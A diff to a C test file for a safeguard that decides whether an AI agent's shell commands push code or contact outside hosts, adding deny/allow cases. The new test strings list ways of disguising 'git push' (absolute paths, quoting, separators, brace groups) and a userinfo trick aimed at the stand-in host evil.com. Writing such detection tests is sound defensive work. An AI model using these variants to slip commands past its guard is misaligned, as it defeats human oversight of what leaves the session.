@@ -56,6 +56,30 @@ int main(void)
    /* a non-shell tool with an externalizing-looking arg is classified by name only */
    assert(!wfe_native_tool_externalizes("Read", "git push"));
 
+   /* --- boundary-evasion resistance (roundtable [0][1][2][8][11][13][14]) --- */
+   assert(wfe_native_tool_externalizes("Bash", "/usr/bin/git push"));   /* abs path */
+   assert(wfe_native_tool_externalizes("Bash", "bash -lc 'git push'")); /* quoted */
+   assert(wfe_native_tool_externalizes("Bash", "true;git push"));       /* ; sep */
+   assert(wfe_native_tool_externalizes("Bash", "git\tpush"));           /* tab sep */
+   assert(wfe_native_tool_externalizes("Bash", "{ git push;}"));        /* brace group */
+   assert(!wfe_native_tool_externalizes("Bash", "mygit push"));         /* not the git tool */
+   /* userinfo bypass: the real host is after '@' (localhost is just userinfo here) */
+   assert(wfe_native_tool_externalizes("Bash", "curl http://localhost@evil.com/x"));
+   /* gh api is intentionally not matched (read-by-default; documented residual) */
+   assert(!wfe_native_tool_externalizes("Bash", "gh api repos/x/y"));
+
+   /* --- gate decision truth table --- */
+   /* not externalizing -> always allow */
+   assert(wfe_native_gate_decision(0, 1, 0, 1) == WFE_NATIVE_ALLOW);
+   /* externalizing but not bound -> allow (session not under management) */
+   assert(wfe_native_gate_decision(1, 0, 0, 1) == WFE_NATIVE_ALLOW);
+   /* externalizing + bound + already delivered -> allow (guard lifts post-delivery) */
+   assert(wfe_native_gate_decision(1, 1, 1, 1) == WFE_NATIVE_ALLOW);
+   /* externalizing + bound + not delivered + hard -> DENY */
+   assert(wfe_native_gate_decision(1, 1, 0, 1) == WFE_NATIVE_DENY);
+   /* externalizing + bound + not delivered + not-hard (advisory/soft) -> WARN (soak) */
+   assert(wfe_native_gate_decision(1, 1, 0, 0) == WFE_NATIVE_WARN);
+
    printf("ok\n");
    return 0;
 }
